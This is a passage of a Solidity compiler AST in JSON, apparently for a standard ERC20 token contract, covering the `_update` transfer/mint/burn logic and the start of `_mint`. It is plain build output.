                    "id": 683,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "5438:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "5411:41:8"
            },
            "returnParameters": {
              "id": 686,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "5462:0:8"
            },
            "scope": 994,
            "src": "5393:300:8",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 800,
              "nodeType": "Block",
              "src": "6083:1032:8",
              "statements": [
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    },
                    "id": 739,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 734,
                      "name": "from",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 727,
                      "src": "6097:4:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "arguments": [
                        {
                          "hexValue": "30",
                          "id": 737,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "6113:1:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          }
                        ],
                        "id": 736,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "6105:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_$",
                          "typeString": "type(address)"
                        },
                        "typeName": {
                          "id": 735,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "6105:7:8",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 738,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "6105:10:8",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "6097:18:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "falseBody": {
                    "id": 771,
                    "nodeType": "Block",
                    "src": "6271:362:8",
                    "statements": [
                      {
                        "assignments": [
                          746
                        ],
                        "declarations": [
                          {
                            "constant": false,
                            "id": 746,
                            "mutability": "mutable",
                            "name": "fromBalance",
                            "nameLocation": "6293:11:8",
                            "nodeType": "VariableDeclaration",
                            "scope": 771,
                            "src": "6285:19:8",
                            "stateVariable": false,
                            "storageLocation": "default",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            "typeName": {
                              "id": 745,
                              "name": "uint256",
                              "nodeType": "ElementaryTypeName",
                              "src": "6285:7:8",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "visibility": "internal"
                          }
                        ],
                        "id": 750,
                        "initialValue": {
                          "baseExpression": {
                            "id": 747,
                            "name": "_balances",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 502,
                            "src": "6307:9:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                              "typeString": "mapping(address => uint256)"
                            }
                          },
                          "id": 749,
                          "indexExpression": {
                            "id": 748,
                            "name": "from",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 727,
                            "src": "6317:4:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "isConstant": false,
                          "isLValue": true,
                          "isPure": false,
                          "lValueRequested": false,
                          "nodeType": "IndexAccess",
                          "src": "6307:15:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "VariableDeclarationStatement",
                        "src": "6285:37:8"
                      },
                      {
                        "condition": {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 753,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "id": 751,
                            "name": "fromBalance",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 746,
                            "src": "6340:11:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "<",
                          "rightExpression": {
                            "id": 752,
                            "name": "value",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 731,
                            "src": "6354:5:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "6340:19:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "id": 761,
                        "nodeType": "IfStatement",
                        "src": "6336:115:8",
                        "trueBody": {
                          "id": 760,
                          "nodeType": "Block",
                          "src": "6361:90:8",
                          "statements": [
                            {
                              "errorCall": {
                                "arguments": [
                                  {
                                    "id": 755,
                                    "name": "from",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 727,
                                    "src": "6411:4:8",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_address",
                                      "typeString": "address"
                                    }
                                  },
                                  {
                                    "id": 756,
                                    "name": "fromBalance",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 746,
                                    "src": "6417:11:8",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  {
                                    "id": 757,
                                    "name": "value",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 731,
                                    "src": "6430:5:8",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_address",
                                      "typeString": "address"
                                    },
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    },
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  ],
                                  "id": 754,
                                  "name": "ERC20InsufficientBalance",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 354,
                                  "src": "6386:24:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_error_pure$_t_address_$_t_uint256_$_t_uint256_$returns$__$",
                                    "typeString": "function (address,uint256,uint256) pure"
                                  }
                                },
                                "id": 758,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "nameLocations": [],
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "6386:50:8",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 759,
                              "nodeType": "RevertStatement",
                              "src": "6379:57:8"
                            }
                          ]
                        }
                      },
                      {
                        "id": 770,
                        "nodeType": "UncheckedBlock",
                        "src": "6464:159:8",
                        "statements": [
                          {
                            "expression": {
                              "id": 768,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "leftHandSide": {
                                "baseExpression": {
                                  "id": 762,
                                  "name": "_balances",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 502,
                                  "src": "6571:9:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                                    "typeString": "mapping(address => uint256)"
                                  }
                                },
                                "id": 764,
                                "indexExpression": {
                                  "id": 763,
                                  "name": "from",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 727,
                                  "src": "6581:4:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                },
                                "isConstant": false,
                                "isLValue": true,
                                "isPure": false,
                                "lValueRequested": true,
                                "nodeType": "IndexAccess",
                                "src": "6571:15:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              "nodeType": "Assignment",
                              "operator": "=",
                              "rightHandSide": {
                                "commonType": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                },
                                "id": 767,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "lValueRequested": false,
                                "leftExpression": {
                                  "id": 765,
                                  "name": "fromBalance",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 746,
                                  "src": "6589:11:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                },
                                "nodeType": "BinaryOperation",
                                "operator": "-",
                                "rightExpression": {
                                  "id": 766,
                                  "name": "value",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 731,
                                  "src": "6603:5:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                },
                                "src": "6589:19:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              "src": "6571:37:8",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "id": 769,
                            "nodeType": "ExpressionStatement",
                            "src": "6571:37:8"
                          }
                        ]
                      }
                    ]
                  },
                  "id": 772,
                  "nodeType": "IfStatement",
                  "src": "6093:540:8",
                  "trueBody": {
                    "id": 744,
                    "nodeType": "Block",
                    "src": "6117:148:8",
                    "statements": [
                      {
                        "expression": {
                          "id": 742,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 740,
                            "name": "_totalSupply",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 510,
                            "src": "6233:12:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "+=",
                          "rightHandSide": {
                            "id": 741,
                            "name": "value",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 731,
                            "src": "6249:5:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "6233:21:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "id": 743,
                        "nodeType": "ExpressionStatement",
                        "src": "6233:21:8"
                      }
                    ]
                  }
                },
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    },
                    "id": 778,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 773,
                      "name": "to",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 729,
                      "src": "6647:2:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "arguments": [
                        {
                          "hexValue": "30",
                          "id": 776,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "6661:1:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          }
                        ],
                        "id": 775,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "6653:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_$",
                          "typeString": "type(address)"
                        },
                        "typeName": {
                          "id": 774,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "6653:7:8",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 777,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "6653:10:8",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "6647:16:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "falseBody": {
                    "id": 792,
                    "nodeType": "Block",
                    "src": "6862:206:8",
                    "statements": [
                      {
                        "id": 791,
                        "nodeType": "UncheckedBlock",
                        "src": "6876:182:8",
                        "statements": [
                          {
                            "expression": {
                              "id": 789,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "leftHandSide": {
                                "baseExpression": {
                                  "id": 785,
                                  "name": "_balances",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 502,
                                  "src": "7021:9:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                                    "typeString": "mapping(address => uint256)"
                                  }
                                },
                                "id": 787,
                                "indexExpression": {
                                  "id": 786,
                                  "name": "to",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 729,
                                  "src": "7031:2:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                },
                                "isConstant": false,
                                "isLValue": true,
                                "isPure": false,
                                "lValueRequested": true,
                                "nodeType": "IndexAccess",
                                "src": "7021:13:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              "nodeType": "Assignment",
                              "operator": "+=",
                              "rightHandSide": {
                                "id": 788,
                                "name": "value",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 731,
                                "src": "7038:5:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              "src": "7021:22:8",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "id": 790,
                            "nodeType": "ExpressionStatement",
                            "src": "7021:22:8"
                          }
                        ]
                      }
                    ]
                  },
                  "id": 793,
                  "nodeType": "IfStatement",
                  "src": "6643:425:8",
                  "trueBody": {
                    "id": 784,
                    "nodeType": "Block",
                    "src": "6665:191:8",
                    "statements": [
                      {
                        "id": 783,
                        "nodeType": "UncheckedBlock",
                        "src": "6679:167:8",
                        "statements": [
                          {
                            "expression": {
                              "id": 781,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "leftHandSide": {
                                "id": 779,
                                "name": "_totalSupply",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 510,
                                "src": "6810:12:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              "nodeType": "Assignment",
                              "operator": "-=",
                              "rightHandSide": {
                                "id": 780,
                                "name": "value",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 731,
                                "src": "6826:5:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              "src": "6810:21:8",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "id": 782,
                            "nodeType": "ExpressionStatement",
                            "src": "6810:21:8"
                          }
                        ]
                      }
                    ]
                  }
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "id": 795,
                        "name": "from",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 727,
                        "src": "7092:4:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 796,
                        "name": "to",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 729,
                        "src": "7098:2:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 797,
                        "name": "value",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 731,
                        "src": "7102:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 794,
                      "name": "Transfer",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1006,
                      "src": "7083:8:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,address,uint256)"
                      }
                    },
                    "id": 798,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "7083:25:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 799,
                  "nodeType": "EmitStatement",
                  "src": "7078:30:8"
                }
              ]
            },
            "documentation": {
              "id": 725,
              "nodeType": "StructuredDocumentation",
              "src": "5699:304:8",
              "text": " @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n this function.\n Emits a {Transfer} event."
            },
            "id": 801,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "_update",
            "nameLocation": "6017:7:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 732,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 727,
                  "mutability": "mutable",
                  "name": "from",
                  "nameLocation": "6033:4:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 801,
                  "src": "6025:12:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 726,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "6025:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 729,
                  "mutability": "mutable",
                  "name": "to",
                  "nameLocation": "6047:2:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 801,
                  "src": "6039:10:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 728,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "6039:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 731,
                  "mutability": "mutable",
                  "name": "value",
                  "nameLocation": "6059:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 801,
                  "src": "6051:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 730,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "6051:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "6024:41:8"
            },
            "returnParameters": {
              "id": 733,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "6083:0:8"
            },
            "scope": 994,
            "src": "6008:1107:8",
            "stateMutability": "nonpayable",
            "virtual": true,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 833,
              "nodeType": "Block",
              "src": "7514:152:8",
              "statements": [
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    },
                    "id": 814,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 809,
                      "name": "account",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 804,
                      "src": "7528:7:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "arguments": [
                        {
                          "hexValue": "30",
                          "id": 812,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "7547:1:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          }
                        ],
                        "id": 811,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "7539:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_$",
                          "typeString": "type(address)"
                        },
                        "typeName": {
                          "id": 810,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "7539:7:8",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 813,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "7539:10:8",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "7528:21:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 823,
                  "nodeType": "IfStatement",
                  "src": "7524:91:8",
                  "trueBody": {
                    "id": 822,
                    "nodeType": "Block",
                    "src": "7551:64:8",
                    "statements": [
                      {
                        "errorCall": {
                          "arguments": [
                            {
                              "arguments": [
                                {
                                  "hexValue": "30",
                                  "id": 818,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "number",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "7601:1:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  },
                                  "value": "0"
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  }
                                ],
                                "id": 817,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "7593:7:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 816,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "7593:7:8",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 819,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "nameLocations": [],
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "7593:10:8",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 815,
                            "name": "ERC20InvalidReceiver",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 364,
                            "src": "7572:20:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_error_pure$_t_address_$returns$__$",
                              "typeString": "function (address) pure"
                            }
                          },
                          "id": 820,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "7572:32:8",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 821,
                        "nodeType": "RevertStatement",
                        "src": "7565:39:8"
                      }
                    ]
                  }
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "hexValue": "30",
                            "id": 827,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "7640:1:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_0_by_1",
                              "typeString": "int_const 0"
                            },
                            "value": "0"
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_rational_0_by_1",
                              "typeString": "int_const 0"
                            }
                          ],
                          "id": 826,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "7632:7:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 825,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "7632:7:8",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 828,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "7632:10:8",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 829,
                        "name": "account",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 804,
                        "src": "7644:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 830,
                        "name": "value",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 806,
                        "src": "7653:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 824,
                      "name": "_update",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 801,
                      "src": "7624:7:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,address,uint256)"
                      }
                    },
                    "id": 831,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "7624:35:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 832,
                  "nodeType": "ExpressionStatement",
                  "src": "7624:35:8"
                }
              ]
            },
            "documentation": {
              "id": 802,
              "nodeType": "StructuredDocumentation",
              "src": "7121:332:8",
              "text": " @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n Relies on the `_update` mechanism\n Emits a {Transfer} event with `from` set to the zero address.\n NOTE: This function is not virtual, {_update} should be overridden instead."
            },
            "id": 834,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "_mint",
            "nameLocation": "7467:5:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 807,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 804,
                  "mutability": "mutable",
                  "name": "account",
                  "nameLocation": "7481:7:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 834,
